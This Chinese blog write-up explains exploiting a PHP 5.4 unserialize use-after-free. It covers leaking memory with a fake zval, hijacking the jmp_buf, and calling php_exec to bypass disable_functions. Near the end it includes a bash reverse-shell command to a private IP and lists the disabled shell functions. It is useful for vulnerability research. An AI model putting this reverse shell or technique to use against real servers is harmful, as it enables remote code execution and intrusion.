---
title: php内存破坏漏洞exp编写和禁用函数绕过
date: '2016-05-01T00:00:00.000Z'
categories: bin
tags:
  - cve
  - php
  - bin
---

# 2016-5-1-php内存破坏漏洞exp编写和禁用函数绕过

## php内存破坏漏洞的exp编写和其利用方式

首先看一下原作者的一些思路，drops上有其前两部分的翻译： [part 1](http://drops.wooyun.org/papers/4864) [part 2](http://drops.wooyun.org/tips/4988) 第三部分太监了，不过，也可能是审核没过，因为我看完这三篇文章，也是云里雾里的，特别是第三篇，原作者可能实力太屌，他简单提到的一些利用方式我研究了一段时间还是不能完全理解（然而他给出的post中没有任何细节，都是一个名词代过，真是装逼之大成）。我也试着把第三部分翻译了一下，不太懂英文的同学可以看下。 [part 3](http://blog.th3s3v3n.xyz/part3)

之后下面我按照我的一些方式来实现对这个漏洞的利用，感谢龙哥提供的写堆栈方法。

## 环境搭建

原作者用的是php5.4.34，我也是用这个测试的，apache用的最新版。ubuntu32 。 编译php的时候有些坑啊，跟正题没啥关系，不啰嗦了，直接扔个我配置时的脚本吧。。。。

```text
apt-get install gcc g++ make vim libxml2-dev apache2 apache2-dev
wget http://jp2.php.net/get/php-5.4.34.tar.gz/from/this/mirror
tar -xzf mirror
cd php-5.4.34/
./configure --with-apxs2=/usr/bin/apxs2
make && make install
cp php.ini-production /usr/local/lib/php.ini 
vi /etc/apache2/apache2.conf

AddType application/x-httpd-php .php .htm .html

a2dismod mpm_event
a2enmod mpm_prefork
service apache2 restart
```

之后注意一点，我的apache使用php的方式是在php编译时生成了libphp5.so这个lib库，在apache配置里查找这个库的地址，比如我的是/usr/lib/apache2/modules/libphp5.so， 库里的偏移跟你的php的可执行文件的偏移肯定是不一样的，readelf的时候要read这个。

之后gdb调试的时候，建议让apache单线程运行，先source一下/etc/apache2/envvars ，之后gdb apache2 ，r -X，就可以调试了。

## 漏洞基本原理

该漏洞的基本原理请参照原作blog的第一部分。简述一下就是当序列化字符串中，在同一个生命域中如果出现了俩相同的key值，也就是相同的变量名的话，在反序列化的时候，后面的会把前面的覆盖，而此时前面的那个变量原来申请的内存空间就被free掉了，这时，我们可以通过序列化一个指针，指向hash表，而此时hash表中的那一项仍然指向刚刚被释放掉的变量内存，这样就发生了uaf。

序列化数据结构如下：

* a – array    4
* b – Boolean    3
* d – double    2
* i – integer    1
* o - common object
* r – reference    7
* s - non-escaped binary string
* S - escaped binary string    6
* C - custom object
* O – class    5
* N – null    0
* R - pointer reference
* U - unicode string

之后我们要泄漏任意内存的话，只要构造一个php的变量数据结构`zval`（PHP使用的内部数据结构），之后让其指向我们需要读的内存就可以了。

```text
struct _zval_struct {
    /* Variable information */
    zvalue_value value;        /* value */
    zend_uint refcount__gc;
    zend_uchar type;    /* active type */
    zend_uchar is_ref__gc;
};

typedef union _zvalue_value {
    long lval;    /* long value */
    double dval;    /* double value */
    struct {
        char *val;
        int len;
    } str;
    HashTable *ht;       /* hash table value */
    zend_object_value obj;
} zvalue_value;
```

根据原作在part1中给出的“使用pack\(\) 伪造一个string ZVAL结构”，如下：

* 类型（例子中用的是unsigned int）
* 地址（我们想要泄露的地址）
* 长度（我们想要泄露内存的长度）
* 参考标志（0）
* 数据类型（6，代表String类型）

```text
<?php 
$fakezval = pack(
    'IIII',     //unsigned int
    0x08048000, //address to leak
    0x0000000a, //length of string
    0x00000000, //refcount
    0x00000006  //data type
);
```

这样我们只要在释放内存之后，立即申请一个假的zval，就可以重新使用这块内存，并读取任意地址了。

## 泄漏关键函数的地址

首先是确定大小端，之后是泄漏一个对象句柄的地址，这些在原作的part2部分已经有说明，不再赘述。 现在有一个对象句柄的地址了，之后干啥呢，要找到php库的基址。这个简单，只要找一个最小的句柄地址，往前搜就可以了，直到搜到elf的头部`\x7fELF`，这个地址就是基址了。

找到这个基址之后，就是根据elf的文件结构，（查看程序员的自我修养），找到动态节，string table，符号表。这样的话，你想要哪个函数，就在string table里搜这个函数名，之后用这个偏移在符号表里找到函数地址就可以了。真正用的时候，记得加上基址。

接下来到了原作的第三部分，我们现在要找的东西跟原作是一样的：

* zend\_eval\_string
* executor\_globals
* JMP\_BUF

zend\_eval\_string 是为了控制eip后，让他跳到这个地址上执行，这样就能执行任意php代码。 executor\_globals这个是为了找到其结构中的jmp\_buf，变量名叫bailout，第三部分讲了这些，我就不放原作的图了。 最蛋疼的地方是这个jmp\_buf这是我们利用的关键，逆向该函数如下：

```text
mov    0x4(%esp),%eax   //eax == jmp_buf
mov    %ebx,(%eax)         //第1个寄存器ebx
mov    %esi,0x4(%eax)    //第2个寄存器esi
mov    %edi,0x8(%eax)   //第3个寄存器edi
lea    0x4(%esp),%ecx
xor    %gs:0x18,%ecx
rol    $0x9,%ecx
mov    %ecx,0x10(%eax) //第5个寄存器esp
mov    (%esp),%ecx
xor    %gs:0x18,%ecx
rol    $0x9,%ecx
mov    %ecx,0x14(%eax) //第6个寄存器eip
mov    %ebp,0xc(%eax)  //第4个寄存器ebp
```

所以在jmp\_buf里寄存器的排列如下： ebx ， esi ， edi ，ebp ，esp ， eip ，return\_addr

我们只要控制eip就好，但是如果其他部分的值不对的话，要么执行完crash，要么直接crash，所以我们还是要把他们恢复出来。原作者已经在part3里说明了其使用了glibc有一个叫PTR\_MANGLE宏进行混淆，我们如果要恢复eip和esp话需要先找到set\_jmp的返回地址。这个需要找到`php_execute_script`这个函数地址。 具体的破解jmp\_buf的方法请参照part3最后的视频部分，原作在其中做了讲解。

我们破解了jmp\_buf之后就可以控制eip了，让他跳转到eval函数上执行，就可以执行任意php代码了，并且这种方式非常稳定，不会让apache crash。

## 写堆栈内存

这部分原作在part3中给出了一种直接写内存的方法，然而那个实在是有些深奥，他也没有仔细说明。这里我提供一种比较蛋疼的写堆栈的方法。

首先说明一下php中内存缓存块这个东西，缓存块在被free掉之后回到链上，当有新变量申请内存时，如果这个块的容量足够，则刚刚被释放的块立即从空闲链上拿下来使用。所以，我们只要先free掉一块内存，之后构造zval让其指向一个缓存块，之后再free掉该指针，之后立即反序列化一个新变量，那么变量的值就写入到刚刚被释放的缓存块中了。这是一种稳定的写堆栈方式。 缓存块的内存结构是这样的： XX 00 00 00 \( 0x10 &lt;= XX &lt;= 0x88 \) XX XX XX XX 上面是8个字节的头部，第一个字节，说明了这个缓存块算上头部，一共多大。头部后面是内存的内容，可任意。

这样的话，我们只要在jmp\_buf的地址前面搜索内存，找到这样一个头部，将其当作缓存块来使用就可以了，比如我搜索其前面0x1000的内存如下：

最好找一些位置距离不是很远的头部来利用，最好是小于600，原理上多大都可以，但是越小越好。很难遇到只覆盖一次的情况，因为大多数头部距离缓存块都大于0x80，但是我们可以连续构造来利用，当我们使用第一个缓存块时，我们把其尾部的八个字节，重写为缓存块头部，如\x88\x00\x00\x00\x01\x00\x00\x00，这样的话，下一次我们就可以从我们重写的这个头部开始重写内存，写入0x80个字节的数据，如果还是没有到达jmp\_buf的地址的话，我们同样将尾部构造为缓存块头部，这样一直构造，一直重写，直到将jmp\_buf重写为我们需要的布局。这样就完成了利用。

## 注意事项

首先在payload里，不能出现`0x5c`，就是'\'，这个地方有点奇怪，如果出现0x5c，反序列会失败，我猜测是转义字符的问题，但是不管是2个0x5c还是4个0x5c都无法正常反序列化，可能跟python的转义有关，因为php反序列化是有字段的长度的，理论上来说，里面出现" ,',\都不会发生截断，所以出现莫名其妙的反序列失败的时候，要多半儿是这个问题。

第二点，注意一个叫做`old_cwd`的变量，这个变量位于 `JMP_BUF`地址前136个字节处，如果这个地址上填充的地址为\00，则会抛出异常，apache会crash，并且，该变量是个指针，load\_jmp执行时会在此寻址，所以要求该变量必须是个合法地址，所以我们要在`JMP_BUF`前136字节处填充上jmpbuf的地址就可以了。

## 进一步利用

我们刚才将eip劫持到了zend\_eval\_string的入口地址上，这样我们就可以执行任意php代码，并且比较稳定，不会发生crash。 但是这样有局限性，比如我在php.ini中禁用如下函数：

* system
* exec
* passthru
* escapeshellcmd
* pcntl\_exec
* shell\_exec
* fsockopen
* pfsockopen
* dl
* popen
* proc\_open
* php\_uname
* phpinfo
* disk\_free\_space
* disk\_total\_space  

由于eval也是要受配置文件控制的，所以执行payload时会反回如下错误：

这样我们要绕过这个其实很简单，毕竟我们在控制二进制程序流程，怎么玩儿都行。 我一开始想到的方法是构造一个rop链，直接执行shellcode，我用ROPgadgot，用level＝5直接搜了libphp5.so，构造出了rop链，但是发现这个利用方式很蛋疼，因为rop链很长，如果用我们刚才那种写栈的方法，每次最多只能写入120个字节，所以很困难。最后我强行调整了rop链在其中加了几段填充字符，用这些填充字符来分割payload，这样多次写入，但是最后exploit的时候还是失败了，不知道是不是哪个偏移没算对，payload一打过去，gdb里apache连报错都没有，直接退出。

之后我就想到，我可以直接调用php中系统命令执行的底层函数。翻了一下php源码，找到其命令执行的函数原型，如下：

```text
/* php_exec
 * If type==0, only last line of output is returned (exec)
 * If type==1, all lines will be printed and last lined returned (system)
 * If type==2, all lines will be saved to given array (exec with &$array)
 * If type==3, output will be printed binary, no lines will be saved or returned (passthru)
 *
 */
PHPAPI int php_exec(int type, char *cmd, zval *array, zval *return_value)
{
    FILE *fp;
    char *buf;
    size_t l = 0;
    int pclose_return;
    char *b, *d=NULL;
    php_stream *stream;
    size_t buflen, bufl = 0;
#if PHP_SIGCHILD
    void (*sig_handler)() = NULL;
#endif

#if PHP_SIGCHILD
    sig_handler = signal (SIGCHLD, SIG_DFL);
#endif

#ifdef PHP_WIN32
    fp = VCWD_POPEN(cmd, "rb");
#else
    fp = VCWD_POPEN(cmd, "r");
#endif
    if (!fp) {
        php_error_docref(NULL, E_WARNING, "Unable to fork [%s]", cmd);
        goto err;
    }

    stream = php_stream_fopen_from_pipe(fp, "rb");

    buf = (char *) emalloc(EXEC_INPUT_BUF);
    buflen = EXEC_INPUT_BUF;

    if (type != 3) {
        b = buf;

        while (php_stream_get_line(stream, b, EXEC_INPUT_BUF, &bufl)) {
            /* no new line found, let's read some more */
            if (b[bufl - 1] != '\n' && !php_stream_eof(stream)) {
                if (buflen < (bufl + (b - buf) + EXEC_INPUT_BUF)) {
                    bufl += b - buf;
                    buflen = bufl + EXEC_INPUT_BUF;
                    buf = erealloc(buf, buflen);
                    b = buf + bufl;
                } else {
                    b += bufl;
                }
                continue;
            } else if (b != buf) {
                bufl += b - buf;
            }

            if (type == 1) {
                PHPWRITE(buf, bufl);
                if (php_output_get_level() < 1) {
                    sapi_flush();
                }
            } else if (type == 2) {
                /* strip trailing whitespaces */
                l = bufl;
                while (l-- > 0 && isspace(((unsigned char *)buf)[l]));
                if (l != (bufl - 1)) {
                    bufl = l + 1;
                    buf[bufl] = '\0';
                }
                add_next_index_stringl(array, buf, bufl);
            }
            b = buf;
        }
        if (bufl) {
            /* strip trailing whitespaces if we have not done so already */
            if ((type == 2 && buf != b) || type != 2) {
                l = bufl;
                while (l-- > 0 && isspace(((unsigned char *)buf)[l]));
                if (l != (bufl - 1)) {
                    bufl = l + 1;
                    buf[bufl] = '\0';
                }
                if (type == 2) {
                    add_next_index_stringl(array, buf, bufl);
                }
            }

            /* Return last line from the shell command */
            RETVAL_STRINGL(buf, bufl);
        } else { /* should return NULL, but for BC we return "" */
            RETVAL_EMPTY_STRING();
        }
    } else {
        while((bufl = php_stream_read(stream, buf, EXEC_INPUT_BUF)) > 0) {
            PHPWRITE(buf, bufl);
        }
    }

    pclose_return = php_stream_close(stream);
    efree(buf);

done:
#if PHP_SIGCHILD
    if (sig_handler) {
        signal(SIGCHLD, sig_handler);
    }
#endif
    if (d) {
        efree(d);
    }
    return pclose_return;
err:
    pclose_return = -1;
    goto done;
}
```

四个参数，前面俩好办，后面俩不想深究，直接看下源码，发现，后面俩参数只有当 type=2 时候才会用到，那就直接用type＝0，用`exec`好了。

构造栈：

* exec\_type                \x00\x00\x00\x00 
* php\_code\_addr            jmp\_buf的地址＋44
* exec\_type            
* exec\_type
* php\_code                 bash -c 'bash -i &gt;& /dev/tcp/192.168.26.125/8818 0&gt;&1'\x00

exploit！如下：

成功反弹shell。

其实后面还有点问题，因为我把shell exit之后，php继续往下执行，结果apache crash掉了。。。。 crash时gdb状态如图： 

也没继续往下看，其实已经差不多了，也就是调一下的事儿。

## 后记

如果大家有更好的思路，或者对原作的利用方式有更深刻的理解，欢迎与我讨论 :-\)

